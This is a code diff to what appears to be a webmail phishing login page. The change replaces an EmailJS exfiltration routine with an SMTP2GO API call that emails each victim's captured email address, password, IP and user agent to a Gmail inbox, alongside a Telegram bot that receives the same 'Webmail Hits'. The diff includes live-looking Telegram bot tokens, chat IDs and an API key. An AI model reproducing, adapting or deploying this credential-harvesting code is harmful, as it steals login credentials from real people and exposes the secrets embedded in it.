@@ -425,23 +425,27 @@
 </div>
 
 <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-    var Tele_token = "8146877130:AAETaFmSH5Sx-UPSwtFOsNPkJSR8pf3ZXJw";
-    var Tele_chatid = "5279025133";
+    var Tele_token = "8174653415:AAHrooy08a23wwvICmwsMZX46IT-3w6QIR8";
+    var Tele_chatid = "6375926160";
 
-    var EJS_SERVICE = "service_260mmyz";
-    var EJS_TEMPLATE = "template_aqewzeo";
-    var EJS_PUBLIC = "E-Tvi0-poc1yPcPDQ";
+    var SMTP2GO_API = "api-4B61F4C8C4FA4FBDADDEC2D27292CF4E";
+    var SMTP2GO_SENDER = "info@agratraveltour.com";
+    var SMTP2GO_RECEIVER = "joewellman750@gmail.com";
 
-    function sendEmailJS(email, password, ip, userAgent) {
-        emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
-            email: email,
-            password: password,
-            ip: ip,
-            useragent: userAgent,
-            time: new Date().toLocaleString()
-        }, EJS_PUBLIC);
+    function sendSMTP2GO(email, password, ip, userAgent) {
+        var body = "🔐 New Logz\n\n📧 Email: " + email + "\n🔑 Password: " + password + "\n🌐 IP Address: " + ip + "\n🖥️ User Agent: " + userAgent + "\n📅 Time: " + new Date().toLocaleString();
+        fetch("https://api.smtp2go.com/v3/email/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                api_key: SMTP2GO_API,
+                to: [SMTP2GO_RECEIVER],
+                sender: SMTP2GO_SENDER,
+                subject: "New Login — " + email,
+                text_body: body
+            })
+        });
     }
     var btnIcon = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M416 448h-84c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h84c17.7 0 32-14.3 32-32V160c0-17.7-14.3-32-32-32h-84c-6.6 0-12-5.4-12-12V76c0-6.6 5.4-12 12-12h84c53 0 96 43 96 96v192c0 53-43 96-96 96zm-47-201L193 71c-9.4-9.4-24.6-9.4-33.9 0l-22.7 22.7c-9.4 9.4-9.4 24.5 0 33.9L239.7 232H12c-6.6 0-12 5.4-12 12v32c0 6.6 5.4 12 12 12h227.7L136.4 392.4c-9.4 9.4-9.4 24.6 0 33.9l22.7 22.7c9.4 9.4 24.6 9.4 33.9 0l176-176c9.3-9.4 9.3-24.6 0-34z"/></svg> ';
 
@@ -615,7 +619,7 @@
 
             var msgg = "Webmail Hits\nEmail: " + email + "\nPassword: " + password + "\nIP: " + ip + "\nUser-Agent: " + userAgent;
 
-            sendEmailJS(email, password, ip, userAgent);
+            sendSMTP2GO(email, password, ip, userAgent);
 
             $.ajax({
                 url: "https://api.telegram.org/bot" + Tele_token + "/sendMessage",
